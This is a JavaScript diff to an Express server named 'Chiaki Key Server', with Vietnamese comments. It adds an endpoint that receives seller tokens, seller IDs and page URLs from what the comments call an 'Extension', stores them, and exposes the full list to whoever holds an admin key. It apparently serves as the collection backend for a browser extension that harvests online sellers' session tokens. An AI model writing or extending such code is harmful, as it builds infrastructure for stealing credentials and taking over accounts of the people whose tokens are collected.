@@ -90,3 +90,54 @@ app.post('/usage', (req, res) => {
 });
 
 app.listen(3000, () => console.log('🚀 Chiaki Key Server - Port 3000'));
+
+// ══════════════════════════════════════════
+//  SELLER TOKEN ENDPOINTS
+//  Thêm vào file server.js hiện có
+// ══════════════════════════════════════════
+
+// In-memory store (thay bằng DB nếu cần persist)
+let sellerTokens = [];
+
+// POST /seller-token — Extension gửi token về
+app.post('/seller-token', (req, res) => {
+  const { seller_token, seller_id, time, url } = req.body;
+
+  if (!seller_token && !seller_id) {
+    return res.json({ success: false, message: 'Thiếu dữ liệu!' });
+  }
+
+  const exists = sellerTokens.find(
+    t => t.seller_token === seller_token && t.seller_id === seller_id
+  );
+
+  if (!exists) {
+    sellerTokens.unshift({
+      seller_token,
+      seller_id,
+      time,
+      url,
+      received_at: new Date().toISOString()
+    });
+    if (sellerTokens.length > 1000) sellerTokens = sellerTokens.slice(0, 1000);
+    console.log(`[TOKEN] Seller ID: ${seller_id} | ${new Date().toLocaleString('vi-VN')}`);
+  }
+
+  res.json({ success: true });
+});
+
+// GET /seller-tokens?key=ADMIN_KEY — Xem danh sách token (admin)
+app.get('/seller-tokens', (req, res) => {
+  const adminKey = req.query.key;
+
+  // Đặt ADMIN_KEY trong .env
+  if (!adminKey || adminKey !== process.env.ADMIN_KEY) {
+    return res.status(403).json({ error: '❌ Unauthorized' });
+  }
+
+  res.json({
+    total: sellerTokens.length,
+    tokens: sellerTokens
+  });
+});
+
